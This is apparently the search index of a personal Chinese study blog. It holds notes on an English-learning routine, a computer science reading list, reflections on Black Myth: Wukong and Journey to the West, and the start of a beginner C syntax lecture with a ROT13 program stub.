{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Track","text":"<p>\u738b\u57a0 - \u5f53\u7136\u6211\u5728\u626f\u6de1 \u9020\u5c31\u6211\u4eca\u5929\u7684\u7f16\u7a0b\u80fd\u529b\u548c\u6d1e\u5bdf\u529b\u7684\uff0c\u4e0d\u662f\u51e0\u767e\u4e07\u884c\u7684\u5927\u578b\u9879\u76ee\uff0c\u800c\u662f\u5c0f\u5230\u51e0\u884c\uff0c\u51e0\u5341\u884c\u4e4b\u77ed\u7684\u7ec3\u4e60\u3002\u4e0d\u8981\u5c0f\u770b\u4e86\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u5b83\u4eec\u5c31\u662f\u7f16\u7a0b\u6700\u7cbe\u9ad3\u7684\u4e1c\u897f\u3002\u53cd\u53cd\u590d\u590d\u7422\u78e8\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u4e0d\u65ad\u6539\u8fdb\u548c\u63d0\u70bc\u91cc\u9762\u7684\u7ed3\u6784\uff0c\u78e8\u783a\u81ea\u5df1\u7684\u601d\u7ef4\u3002\u9010\u6e10\u7684\uff0c\u4f60\u7684\u8ba4\u8bc6\u6c34\u5e73\u5c31\u8d85\u8d8a\u4e86\u8fd9\u4e9b\u51e0\u767e\u4e07\u884c\uff0c\u8ba9\u4eba\u5934\u75db\u7684\u9879\u76ee\u3002 </p>"},{"location":"#core","title":"Core","text":"<ul> <li> <p>Input \u2192 Process \u2192 Output</p> <ul> <li> <p>Input:</p> <ul> <li>\u542c\u529b</li> </ul> <p>SST \u9898\u5e93\u8bad\u7ec3\u3001Spotify \u9ad8\u8d28\u91cf\u64ad\u5ba2</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>Firefly \u9898\u5e93\u5237\u9898\uff0c\u5355\u8bcd\u672c\u7ea0\u97f3\uff0c\u591a\u542c\u4fdd\u6301\u610f\u7fa4\u8bed\u611f</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>Anki \u79ef\u6512\u4e0b\u7684\u9605\u8bfb\u77ed\u8bed\u548c\u8bcd\u6c47\u8fdb\u884c\u80cc\u8bf5\u4e0e\u7ea0\u6b63\uff0c\u8fdb\u884c\u8bed\u6cd5\u642d\u914d Anki \u518d\u80cc\u8bf5</p> <ul> <li>\u9605\u8bfb</li> </ul> <p>FireFly\u3001\u65b0\u6982\u5ff5\u9605\u8bfb\u8bfb\u672c\u3001\u9ad8\u8d28\u91cf\u7f8e\u56fd\u9ad8\u4e2d\u751f\u6587\u5b66\u3001\u5386\u53f2 Textbook\uff0cReading Firfly \u9898\u5e93\u7ffb\u8bd1\u7406\u89e3\u523b\u610f\u8bad\u7ec3\uff0cReadPaper \u4ee5\u53ca\u6c89\u6d78\u5f0f\u7ffb\u8bd1\u505a\u5bfc\u5165\u8fdb\u884c\u6bb5\u843d\u7cbe\u7ffb\uff0c\u7b14\u8bb0\u5f55\u5165 Anki \u4e2d\u8fdb\u884c\u6458\u7ed9\u51fa\u76f8\u5173\u5f15\u7528</p> </li> <li> <p>Process:</p> <ul> <li>\u505a\u9519\u7684\u9898\u76ee\u53cd\u590d\u5f55\u5165 MD \u9519\u9898\u672c\uff0c\u6253\u5370\u540e\u81ea\u884c\u6279\u6539</li> <li>\u91cd\u590d\uff0cRecursion\uff0c\u5927\u6a21\u5757\u62c6\u89e3\u5c0f\u6a21\u5757\u95ee\u9898\u9010\u4e00\u653b\u7834</li> <li>LLM \u5bf9\u4e8e\u5199\u4f5c\u4e0e\u9605\u8bfb\u8fdb\u884c\u5bfc\u5165\u5206\u6790\uff0c\u7ea0\u6b63\u8bed\u6cd5\u3001\u67e5\u8be2\u77ed\u8bed\u642d\u914d</li> <li>Anki \u6216\u767d\u7eb8\u65e9\u4e0a\u590d\u4e60\u5de9\u56fa\u3001\u665a\u4e0a\u7761\u524d\u8bb0\u5fc6\u590d\u4e60\uff0c\u7b2c\u4e8c\u5929\u518d\u56de\u5230\u539f\u8bed\u5883\u91cd\u7406\u89e3</li> <li>\u542c\u529b Spotify YouTube \u5b9a\u5411\u8bdd\u9898\u63d0\u53d6\u5b57\u5e55\u80cc\u8bf5\u4e0d\u719f\u6089\u7684\u5355\u8bcd\u91cd\u590d\u7406\u89e3\u5f55\u5165 Anki</li> </ul> </li> <li> <p>Output:</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>\u8d39\u66fc\u5b66\u4e60\u6cd5\uff0c\u5c06\u9519\u9898\u672c\u4e0e Processed \u63d0\u70bc\u8fc7\u7684\u5355\u8bcd\u4e0e\u8bcd\u7ec4\u642d\u914d\uff0c\u601d\u8003\u8bb0\u5f55\u4e00\u4e9b\u65e5\u8bb0\u5230 Flomo\uff0c\u8bb0\u5f55\u60f3\u6cd5\u3001\u6280\u672f\u7b14\u8bb0\u81f3 Blog \u4e2d\uff0c\u6a21\u62df\u518d\u6b21\u6559\u4f1a\u522b\u4eba</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>\u6a21\u62df\u8c08\u8bdd\u3001\u6f14\u8bb2\u6cd5\uff0c\u901a\u8fc7\u8bdd\u9898\u5047\u88c5\u81ea\u5df1\u5728\u8bb2\u8ff0\u4e00\u4e2a\u6545\u4e8b\uff0c\u4ece Anki \u4e0e\u7b14\u8bb0\u4e2d\u627e\u51fa\u8bcd\u6c47\u8fdb\u884c\u4e32\u8054\u8f93\u51fa\uff0c\u8fdb\u884c Record \u5f55\u5236\u540e\u56de\u653e\u81ea\u7ea0\u8bed\u901f\u4e0e\u8bed\u6cd5\u7b49\u95ee\u9898</p> </li> <li> <p>Tools</p> <ul> <li>\u535a\u5ba2\u9002\u5408\u6587\u79d1\u7c7b\u7684 Abstraction \u518d\u63d0\u70bc\u8f93\u51fa\uff0c\u8fdb\u884c\u6574\u5408\u4fee\u6539</li> <li>Flomo \u9002\u5408\u788e\u7247\u5316 Input \u8fdb\u884c Hash Tag \u6807\u6ce8\u6574\u7406\uff0c\u6d41\u6c34\u8d26\u5f0f\u53cd\u601d</li> <li>Notion \u9002\u5408\u65e5\u6708\u8fdb\u5ea6\u8ba1\u5212\u3001\u9519\u9898\u672c\u7684\u5efa\u7acb\u6253\u5370\u3001\u535a\u5ba2\u7684 Abstraction \u518d\u8f93\u51fa\u3001\u4eba\u751f\u3001\u516c\u53f8\u5927\u9879\u76ee\u8ba1\u5212\u7684\u5efa\u7acb</li> <li>Typora + Docsify + OneDrive \u8bb0\u5f55\u7406\u79d1\u89c4\u6574\u6280\u672f\u7b14\u8bb0\uff0cVisual Studio Code \u63a8\u9001\u81f3 Github</li> </ul> </li> <li>Doing One Thing at a Time</li> <li>Make a Plan \u2192 Recursion, Break in to small peieces.</li> <li>\u53cd\u8106\u5f31\uff1a\u81ea\u5df1\u4e3b\u52a8\u7ed9\u81ea\u5df1\u627e\u5b66\u4e60\u4e0a\u7684\u3001\u5065\u8eab\u4e0a\u7684\u82e6\u5934\u5403</li> </ul> </li> </ul>"},{"location":"#computer-science","title":"Computer Science","text":""},{"location":"#devops","title":"DevOps","text":"<ul> <li>A Practical Guide to Linux, Editors, and Shell</li> </ul>"},{"location":"#network","title":"Network","text":"<ul> <li>\u56fe\u89e3 HTTP</li> <li>Computer Networking: A Top-Down Approach</li> </ul>"},{"location":"#algorithm","title":"Algorithm","text":"<ul> <li>CSE 101</li> <li>Grokking Algorithms</li> </ul>"},{"location":"#design-model","title":"Design Model","text":"<ul> <li>A Philosophy of Software Design</li> <li>Grokking the System Design Interview</li> </ul>"},{"location":"#data-structures","title":"Data Structures","text":"<ul> <li>Discrete Math</li> <li>OI Wiki - Codewar</li> <li>CSE 100 - Review the knowledge of C and C++</li> </ul>"},{"location":"#distributed-systems","title":"Distributed Systems","text":"<ul> <li>MIT 6.004<ul> <li>CSE 140</li> <li>Computer Architecture - zyBooks</li> </ul> </li> <li>MIT 6.824 Distributed Systems</li> <li>MIT 6.S081 Operating System Engineering</li> <li>Computer Systems: A Programmer's Perspective</li> </ul>"},{"location":"#bootcamp","title":"Bootcamp","text":"<ul> <li>The Complete 2023 Web Development Bootcamp</li> <li>100 Days of Code: The Complete Python Pro Bootcamp for 2023</li> </ul>"},{"location":"arts/wukong/","title":"\u897f\u6e38","text":"<p>\u9ed1\u795e\u8bdd\u609f\u7a7a\u6700\u4f4e\u753b\u8d28\u5728 macOS \u4e0a\u6700\u4f4e\u753b\u8d28\u6e38\u73a9\u4e86\u4e09\u5929\u534a\u540e\u5b8c\u6210\u4e86\u6240\u6709\u5267\u60c5\uff0c\u8be6\u60c5\u914d\u7f6e\u65b9\u6cd5\u5728 Wine \u4e00\u6587\u4e2d\uff0c\u5e73\u5e38\u65f6\u95f4\u7528 CrossOver \u505a\u4efb\u4f55\u4e8b\u5b9e\u9645\u4e0a\u90fd\u611f\u89c9\u5f88\u618b\u5c48\uff0c\u56e0\u6b64\u5728\u7ed3\u675f\u6e38\u620f\u540e\u5378\u8f7d\u4e86\u6240\u6709\u865a\u62df\u673a\u914d\u7f6e\uff0c\u91cd\u56de\u73b0\u5b9e\u8e0f\u4e0a\u5c5e\u4e8e\u81ea\u5df1\u7684\u53d6\u7ecf\u4e4b\u8def\u3002\u6e38\u620f\u6d89\u53ca\u7684\u6587\u5316\u548c\u56fe\u9274\u6545\u4e8b\u6700\u4e3a\u5438\u5f15\u4eba\uff0c\u5728\u6b64\u8bb0\u5f55\u4e00\u4e9b\u897f\u6e38\u8bb0\u6587\u5316\u5143\u7d20\u7684\u6458\u6284\u4ee5\u53ca\u89e3\u8bfb\u8d44\u6e90\u3002</p>"},{"location":"arts/wukong/#_2","title":"\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0","text":"<p>gcores.com \u6709\u5f88\u591a\u4f5c\u8005\u5bf9\u6e38\u620f\u5267\u60c5\u548c\u6587\u5316\u6709\u7740\u6df1\u523b\u89e3\u6790\uff0c\u5176\u4e2d\u770b\u5230\u72fc\u5c0f\u660e\u5440\u7528\u300a\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0\u300b\u4f5c\u4e3a\u5f15\u5b50\u89e3\u6790\u6bcf\u7ae0\u6e38\u620f\u5267\u60c5\u5f88\u662f\u6709\u8da3\uff0c\u65e5\u540e\u6709\u673a\u4f1a\u770b\u4e00\u4e0b\u6279\u8bc4\u8bb0\uff1a</p> <p>\u5b59\u609f\u7a7a\u8ba4\u4e3a\u597d\u7537\u4e0d\u8ddf\u5973\u6597\uff0c\u4e00\u68d2\u5b50\u6253\u6b7b\u5979\u4eec\u6709\u70b9\u6b3a\u8d1f\u4eba\uff0c\u5c31\u73a9\u5fc3\u53c8\u8d77\uff0c\u53d8\u4e86\u53ea\u9e70\uff0c\u5c06\u4e03\u5973\u8863\u670d\u6089\u6570\u53fc\u8d70\u3002\uff08\u6253\u6b7b\u5c31\u6ca1\u540e\u9762\u8fd9\u4e48\u591a\u4e8b\u4e86\uff0c\u53ef\u89c1\u5b59\u609f\u7a7a\u4e5f\u662f\u4e2a\u60f9\u4e8b\u7684\u4e3b\u3002\uff09\u609f\u7a7a\u8fd4\u56de\u4e0e\u516b\u6212\u3001\u6c99\u50e7\u6c47\u5408\uff0c\u516b\u6212\u542c\u8bf4\u5973\u5996\u7cbe\u5728\u6d17\u6fa1\uff0c\u53e3\u79f0\u8981\u53bb\u6253\u6740\u5996\u7cbe\uff0c\u201c\u6296\u64de\u7cbe\u795e\uff0c\u6b22\u5929\u559c\u5730\u4e3e\u7740\u9489\u94af\uff0c\u62fd\u5f00\u6b65\uff0c\u5f84\u76f4\u8dd1\u5230\u90a3\u91cc\u3002\u201d\u5148\u662f\u51fa\u8a00\u8c03\u620f\uff0c\u53c8\u5316\u4f5c\u9cb6\u9c7c\u7cbe\uff0c\u5f80\u5973\u5996\u7cbe\u817f\u95f4\u4e71\u94bb\u3002\uff08\u53e4\u65e9\u9ec4\u6bb5\u5b50\u624b\u674e\u5353\u543e\u5927\u547c\uff1a\u53d8\u5f97\u5999\u554a\uff0c\u53ef\u60dc\u6ca1\u53d8\u4e2a\u6ce5\u9cc5\u9cdd\u9c7c\u4ec0\u4e48\u7684\u3002\uff09 \u201c\u9ec4\u9cdd\u95e8\u201d\u7591\u4f3c\u6709\u4e9b\u843d\u540e\u4e86\u3002\uff08\u674e\u5353\u543e\u8bf4\uff0c\u516b\u6212\u4ece\u6765\u4eb2\u8fd1\u5973\u8272\u6ca1\u6709\u50cf\u8fd9\u6b21\u8fd9\u6837\u4eab\u53d7\u7684\uff0c\u8fd9\u6b21\u662f\u6709\u70b9\u592a\u5f97\u610f\u5fd8\u5f62\u4e86\u3002\uff09\u4e0d\u602a\u540e\u9762\u8718\u86db\u7cbe\u4eec\u5411\u767e\u76ee\u9b54\u541b\u72b6\u544a\u516b\u6212\u201c\u5978\u9a97\u201d\u5979\u4eec\u3002</p> <p>\u4e03\u5996\u7cbe\u6ca1\u8863\u670d\u7a7f\uff0c\u8d64\u6761\u6761\u56de\u6d1e\uff0c\u4ece\u5510\u50e7\u9762\u524d\u7b11\u563b\u563b\u8dd1\u8fc7\u53bb\u3002\uff08\u674e\u5353\u543e\u7b11\u6279\uff1a\u8fd9\u80af\u5b9a\u662f\u5510\u50e7\u751f\u5e73\u672a\u89c1\u3002\u867d\u8179\u4e2d\u7a7a\u7a7a\u4f46\u662f\u5927\u9971\u773c\u798f\uff0c\u5316\u658b\u8fd9\u4e00\u8d9f\u771f\u662f\u4e0d\u865a\u6b64\u884c\u554a\uff01\uff09\u8981\u6211\u8bf4\uff0c\u8001\u674e\u8fd9\u5c31\u8fc7\u5206\u4e86\uff0c\u4ed6\u6015\u662f\u4ee5\u5c0f\u4eba\u4e4b\u5fc3\u5ea6\u541b\u5b50\u4e4b\u8179\u3002\u51b5\u5510\u50e7\u53c8\u4e0d\u662f\u516b\u6212\uff0c\u5c82\u80fd\u4e34\u6b7b\u800c\u4ecd\u56fe\u8272\u4e4e\uff1f\u4e03\u5996\u7cbe\u5524\u6765\u4e03\u4e2a\u5e72\u513f\u5b50\uff0c\u5206\u522b\u662f\u871c\u8702\uff0c\u8682\u8702\uff0c\u8826\u8702\uff0c\u73ed\u6bdb\uff0c\u725b\u8722\uff0c\u62b9\u8721\uff0c\u873b\u8713\uff0c\u8bf7\u4ed6\u4eec\u5e2e\u5fd9\u62b5\u6321\u8ffd\u5175\uff0c\u81ea\u5df1\u5219\u9003\u53bb\u5e08\u5144\u767e\u773c\u9b54\u541b\u5bb6\u3002\u4e03\u4e2a\u5996\u602a\u7684\u5e72\u513f\u5b50\uff0c\u8fd9\u4e00\u9898\u6750\u6216\u4e5f\u53ef\u5728\u6e38\u620f\u91cc\u5927\u4e66\u7279\u4e66\u3002\u4f46\u201c\u6e38\u79d1\u201d\u53ea\u628a\u4ed6\u4eec\u505a\u6210\u4e86\u7b2c\u56db\u7ae0\u91cc\u7684\u4e00\u5e2e\u6742\u5175\u5c0f\u602a\u3002</p>"},{"location":"arts/wukong/#_3","title":"\u5f71\u795e\u56fe","text":"<p>\u5bf9\u6bcf\u4e2a\u4eba\u7269 Biligame \u90fd\u505a\u4e86\u56fe\u9274\u6536\u5f55\uff0c\u6e38\u620f\u4e2d\u7684\u6545\u4e8b\u63cf\u8ff0\u80fd\u591f\u76f4\u63a5\u5728\u8fd9\u4e0a\u9762\u9605\u8bfb\uff0c\u751a\u81f3\u8fd8\u6709\u6e38\u620f\u539f\u672c\u7684\u53f0\u8bcd\u6458\u6284\uff0c\u8003\u636e\uff0c\u6280\u80fd\u62db\u5f0f\u7b49\u3002</p>"},{"location":"arts/wukong/#_4","title":"\u73a9\u540e\u611f","text":"<p>\u7b2c\u4e00\u7ae0\u7684\u91d1\u6c60\u957f\u8001\u548c\u7b2c\u4e09\u7ae0\u7684\u9ec4\u7709\u5927\u738b\u662f\u5168\u5267\u60c5\u4e2d\u6700\u559c\u6b22\u7684\u90e8\u5206\uff0c\u90a3\u79cd\u81ea\u604b\u548c\u504f\u6267\u7b26\u5408\u9ed1\u795e\u8bdd\u7684\u9ed1\u6697\u8bbe\u5b9a\u7684\u540c\u65f6\u4e5f\u5e26\u7ed9\u4e86\u81ea\u5df1\u5bf9\u4e8e\u9ed1\u6697\u4e09\u89d2\u4eba\u683c\u7684\u518d\u601d\u7d22\uff0c\u5267\u4e2d\u9ec4\u7709\u5927\u738b\u7684\u53f0\u8bcd\uff1a</p>"},{"location":"arts/wukong/#_5","title":"\u9ec4\u7709","text":"<p>\u6211\u5728\u5f88\u591a\u5947\u602a\u7684\u68a6\u91cc\uff0c\u89c1\u8fc7\u4f60\u4eec\uff0c\u4f60\u4eec\u56e0\u7f18\u9645\u4f1a\u8d70\u5230\u4e00\u8d77\uff0c\u6000\u7740\u5404\u4e0d\u76f8\u540c\u7684\u76ee\u7684\u3002</p> <p>\u4f60\uff0c\u6b32\u6210\u524d\u4eba\u672a\u7adf\u4e4b\u4e1a\uff0c\u4fee\u529f\u5fb7\u5706\u6ee1\u3002</p> <p>\u4f60\uff0c\u6267\u7740\u540e\u4e16\u4f20\u9882\u4e4b\u540d\uff0c\u6c42\u4f4d\u5217\u4ed9\u73ed\u3002</p> <p>\u4f60\uff0c\u60f3\u8df3\u51fa\u4e09\u754c\u4e4b\u5916\uff0c\u56fe\u4e2a\u6e05\u51c0\u81ea\u5728\u3002</p> <p>\u8fd8\u6709\u4f60\uff0c\u65e0\u6240\u6302\u788d\uff0c\u5403\u987f\u9971\u996d\u4fbf\u5584\u54c9\u5584\u54c9\u3002</p> <p>\u53ef\u6211\uff0c\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u4eec\uff0c\u6ee1\u5634\u7684\u60c5\u6000\u5927\u4e49\uff0c\u4e00\u5fc3\u7684\u4e16\u4fd7\u540d\u5229\uff0c\u5531\u4ec0\u4e48\u547d\u4e0d\u7531\u5929\uff0c\u5374\u7b03\u4fe1\u81ea\u5df1\uff0c\u624d\u662f\u5929\u547d\u4e4b\u9009\u3002</p> <p>\u53ef\u60b2\u7684\u53d6\u7ecf\u4eba\u5450\uff0c\u53ea\u8981\u5fc3\u4e2d\u8fd8\u6709\u653e\u4e0d\u4e0b\u7684\u5076\u50cf\uff0c\u7ec8\u6709\u4e00\u5929\uff0c\u5b83\u5c06\u5316\u4e3a\u4fee\u884c\u8def\u4e0a\u65e0\u89e3\u7684\u4e1a\u969c\u3002</p> <p>\u9ec4\u7709\u5927\u738b\u7684\u8bdd\u771f\u5047\u53c2\u534a\uff0c\u548c\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u81ea\u604b\u8005\u4e00\u6837\u5c06\u4eba\u7684\u672c\u6211\u6df1\u523b\u89e3\u6790\uff0c\u89c9\u5f97\u4f17\u4eba\u7686\u9189\u6211\u72ec\u9192\uff0c\u559c\u6b22\u5e26\u7740\u4eba\u6027\u672c\u6076\u7684\u679c\u53bb\u8bc1\u660e\u56e0\u3002\u548c\u7ae0\u8282\u7ed3\u675f\u540e\u7684\u52a8\u753b\u4e00\u6837\uff0c\u4e00\u65e6\u6709\u4e00\u4e2a\u4eba\u6f0f\u51fa\u6076\u5ff5\uff0c\u4ed6\u5c31\u63a8\u7ffb\u6240\u6709\u66fe\u7ecf\u62e5\u6709\u8fc7\u7684\u7f8e\u597d\u8fc7\u7a0b\uff0c\u5927\u7b11\u91d1\u8749\u5b50\u8bf4\u81ea\u5df1\u53c8\u8d62\u4e86\uff0c\u91d1\u8749\u5b50\u53ea\u662f\u7b11\uff1a\u5e08\u5144\u5982\u6b64\u6267\u7740\u8f93\u8d62\uff0c\u53ef\u7b11\uff0c\u53ef\u60b2</p> <p>\u8fd8\u8bb0\u5f97\u76c2\u5170\u4f1a\u4e0a</p> <p>\u4e16\u5c0a\u8bf4\u8fc7\uff1a\u4f17\u751f\u4e4b\u82e6\uff0c\u591a\u56e0\u4e0d\u5b88\u6212\u5f8b\uff0c\u653e\u60c5\u7eb5\u6b32\u3002</p> <p>\u8981\u6211\u8bf4\uff0c\u653e\u5c41\uff01</p> <p>\u4e0d\u6740\u751f\uff0c\u4ec7\u6068\u6c38\u65e0\u6b62\u606f\uff1b</p> <p>\u4e0d\u5077\u76d7\uff0c\u5f3a\u5f31\u5982\u6211\u4f55\u5f02\uff1b</p> <p>\u4e0d\u90aa\u6deb\uff0c\u4e00\u5207\u6709\u60c5\u7686\u5b7d\uff1b</p> <p>\u4e0d\u5984\u8bed\uff0c\u68a6\u5e7b\u6ce1\u5f71\u7a7a\u865a\uff1b</p> <p>\u4e0d\u998b\u9152\uff0c\u5fe7\u6016\u6da8\u843d\u65e0\u5e38\uff1b</p> <p>\u4e0d\u803d\u4e50\uff0c\u82b3\u534e\u5239\u90a3\u800c\u5df2\uff1b</p> <p>\u4e0d\u8d2a\u7720\uff0c\u82e6\u82e6\u4e0d\u5f97\u89e3\u8131\uff1b</p> <p>\u4e0d\u7eb5\u6b32\uff0c\u8bf8\u884c\u4e86\u65e0\u751f\u8da3</p> <p>\u9ec4\u7709\u5927\u738b\u8fd8\u672a\u5f00\u5ead\u5c31\u5df2\u7ecf\u7ed9\u4e16\u4eba\u5b9a\u7f6a\uff1a</p> <p>\u4e16\u4eba\u7686\u6709\u7f6a\uff0c\u7136\u540e\u5728\u6b64\u57fa\u7840\u4e0a\u50cf\u5ba1\u8baf\u72af\u4eba\u4e00\u6837\u5ba1\u5224\u4f17\u751f\u3002</p> <p>\u4fe1\u4ec0\u4e48\u72d7\u5c41\u5982\u6765\uff0c\u4e0d\u5982\u6211\u81ea\u5df1\u6765\uff01</p> <p>\u5728\u6e38\u620f\u4e2d\u4ed6\u5efa\u7acb\u4e86\u5c0f\u96f7\u97f3\u5bfa\u5927\u96c4\u5b9d\u6bbf\uff0c\u548c\u4e3b\u4eba\u5f25\u52d2\u4f5b\u7684\u5927\u96f7\u97f3\u5bfa\u76f8\u547c\u5e94\uff0c\u626e\u6210\u5f25\u52d2\u7684\u6a21\u6837\u9a97\u53d6\u5927\u91cf\u7684\u671d\u5723\u8005\u548c\u795e\u4f5b\u8fdb\u5bfa\uff0c\u7136\u540e\u7528\u5f25\u52d2\u7684\u540e\u5929\u888b\u88c5\u8fdb\u53bb\u70bc\u5316\u6210\u81ea\u5df1\u7684\u9b54\u5316\u5e72\u5c06\u4e3a\u4ed6\u81ea\u5df1\u800c\u6218\u3002</p> <p>\u6211...\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u7684\u4e0b\u573a\uff0c\u53ea\u8981\u4f60\u8fd8\u5728\u4e3a\u4ed6\u4eba\u800c\u6218\uff0c\u5c31\u8fdf\u65e9\u4f1a\u6b7b\u5728\u4ed6\u4eba\u624b\u4e0a\uff0c\u6211\u9ec4\u7709\u53ea\u4e3a\u81ea\u5df1\uff01\u6211\u6ca1\u8f93\uff0c\u6211\u4e0d\u4f1a\u8f93...\u53ea\u8981\uff0c\u53ea\u8981\u518d\u7528\u4e00\u6b21\u90a3\u7334\u5b50\u7684\u5b9d\u8d1d...</p> <p>\u5373\u4f7f\u6218\u8d25\u4ed6\u4e5f\u8ba4\u4e3a\u6211\u547d\u7531\u6211\u4e0d\u7531\u5929\uff0c\u8fd8\u60f3\u518d\u8eab\u4efd\u76d7\u7a83\u4e00\u6b21\u5176\u4ed6\u4f5b\u7684\u6cd5\u5b9d\u7136\u540e\u7ee7\u7eed\u4f5c\u6218\u3002\u771f\u7684\u5f25\u52d2\u4f5b\u51fa\u73b0\u540e\u89e3\u91ca\u9053\uff1a</p> <p>\u4ed6\u539f\u672c\u662f\u4e1c\u6765\u4f5b\u7956\u5f25\u52d2\u4f5b\u9762\u524d\u53f8\u78ec\u7684\u4e00\u4e2a\u9ec4\u7709\u7ae5\u5b50\uff0c\u8d81\u5f25\u52d2\u4f5b\u4e0d\u5728\u5bab\u91cc\u5077\u4e86\u51e0\u4ef6\u5b9d\u8d1d\uff0c\u5728\u5c0f\u897f\u5929\u5047\u4f5b\u6210\u7cbe\u3002</p> <p>\u800c\u6e38\u620f\u4e2d\u5df2\u662f\u7b2c\u4e8c\u6b21\u76d7\u53d6\u4ed6\u7684\u540e\u5929\u888b\uff0c\u5728\u501f\u5927\u5723\u4e4b\u529b\u628a\u888b\u5b50\u70bc\u6210\u4e86\u9500\u9b42\u593a\u9b44\u7684\u90aa\u5b9d\uff0c\u7136\u540e\u5316\u4f5c\u5f25\u52d2\u4f5b\u7684\u6a21\u6837\u501f\u673a\u62a5\u590d\u5f53\u5e74\u6536\u590d\u4ed6\u7684\u4ec7\u4eba</p> <p>\u8be5\u4eba\u7269\u548c\u4f4e\u529f\u80fd NPD \u4e00\u6837\u5584\u4e8e PUA \u548c\u8a00\u8bed\u64cd\u7eb5\uff0c\u5229\u7528\u6ed1\u5761\u8c2c\u8bef\u548c\u7834\u7a97\u6548\u5e94\u5047\u88c5\u5f3a\u5927\u5b9e\u9645\u5f31\u5c0f\u7684\u81ea\u5df1\uff0c\u538c\u6076\u4e16\u4eba\u7684\u672c\u6211\u4f46\u81ea\u5df1\u8eab\u4e0a\u7684\u672c\u6211\u5374\u4f53\u73b0\u7684\u73b2\u79bb\u5c3d\u81f4</p>"},{"location":"arts/wukong/#_6","title":"\u91d1\u6c60\u957f\u8001","text":"<p>\u4e3a\u4e86\u51e0\u4ef6\u8863\u670d\u5c06\u9ec4\u7709\u63d0\u51fa\u7684\u5bf9\u5916\u7269\u7684\u6267\u5ff5\u53d1\u6325\u5230\u4e86\u6781\u81f4\u3002</p> <p>\u6839\u636e\u52a8\u753b\u9ed1\u98ce\u5c71\u91d1\u6c60\u957f\u8001\u5728\u6210\u957f\u8fc7\u7a0b\u4e2d\u8ba4\u8bc6\u4e86\u9ed1\u718a\u7cbe\uff0c\u9ed1\u718a\u7cbe\u5e76\u6ca1\u6709\u6740\u5bb3\u4ed6\u3002</p> <p>\u5728\u539f\u8457\u4e2d\u9ed1\u718a\u7cbe\u4e3b\u52a8\u5b66\u4e60\u4f5b\u6cd5\u6700\u540e\u611f\u52a8\u4e86\u83e9\u8428\u505a\u4e86\u5b88\u5c71\u5927\u795e\uff0c\u6709\u4eba\u731c\u60f3\u662f\u4ed6\u4f20\u6388\u4e86\u91d1\u6c60\u957f\u8001\u957f\u751f\u4e0d\u8001\u4e4b\u672f\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u8fd9\u53e5\u53f0\u8bcd\uff1a</p> <p>\u6211\u4eca\u5e74\u4e8c\u767e\u4e03\u5341\u5c81\uff0c\u7a7a\u6323\u4e86\u51e0\u767e\u4ef6\u8888\u88df\uff0c\u600e\u4e48\u5f97\u6709\u4ed6\u8fd9\u4e00\u4ef6\uff1f</p> <p>\u5176\u4ed6\u9ed1\u98ce\u5c71\u5168\u5267\u60c5\u53ef\u53c2\u8003 B \u7ad9\u535a\u4e3b\u5ddd\u540c\u5b66\u4e0d\u7a7f\u7ae5\u978b\u89e3\u6790</p>"},{"location":"cs/c/2.1/","title":"2.1 Basic Syntax","text":""},{"location":"cs/c/2.1/#mon-lecture","title":"Mon Lecture","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n/* Compile this program with:\n   cc -std=c11 -Wall -Werror -o rotate rotate.c\n */\n\n#define ROT 13\n\nstatic char rotate(char c)\n{\n    c = c + ROT;\n    return c;\n}\n\nint main(int argcount, char *argvalue[])\n{\n    // check the number of arguments\n    if(argcount != 2) {\n        exit(EXIT_FAILURE);\n    }\n    else {\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <ul> <li>C11 \u63d0\u4f9b\u4e24\u79cd\u7c7b\u578b\u7684 comments</li> </ul> <pre><code>/* block comments */\n// comments to the end of a line\n</code></pre> <ul> <li>main \u51fd\u6570\u6267\u884c\uff0c\u91cc\u9762\u7684\u53c2\u6570\u53eb args</li> </ul> <ul> <li>\u5f00\u5934\u7684 <code>#define</code> \u539f\u7406\u5982\u4e0b\uff1a</li> </ul> <p>\u5f53 C \u7f16\u8bd1\u5668\u9047\u5230 #define \u6307\u4ee4\u65f6\uff0c\u4f1a\u5728\u4ee3\u7801\u4e2d\u7528\u8be5\u5e38\u91cf\u6216\u5b8f\u7684\u503c\u66ff\u6362\u6bcf\u6b21\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> <p>\u5728\u4f60\u7684\u4ee3\u7801\u7247\u6bb5\u4e2d\uff0c#define ROT 13 \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a ROT\uff0c\u503c\u4e3a 13 \u7684\u5b8f\u3002\u56e0\u6b64\uff0c\u6bcf\u5f53\u4ee3\u7801\u4e2d\u51fa\u73b0 ROT \u65f6\uff0c\u5b83\u5c06\u88ab\u66ff\u6362\u4e3a 13\u3002</p> <ul> <li><code>#include</code></li> </ul> <p><code>#include</code> \u6307\u4ee4\u7528\u4e8e\u5728\u4f60\u7684 C \u7a0b\u5e8f\u4e2d\u5305\u542b\u5916\u90e8\u6587\u4ef6\u3002\u88ab\u5305\u542b\u6587\u4ef6\u7684\u5185\u5bb9\u4f1a\u88ab\u63d2\u5165\u5230 <code>#include</code> \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002</p> <p>\u4f8b\u5982\uff0c<code>#include &lt;stdio.h&gt;</code> \u5728\u4f60\u7684\u7a0b\u5e8f\u4e2d\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\uff0c\u4f7f\u4f60\u80fd\u591f\u4f7f\u7528 printf\u3001scanf 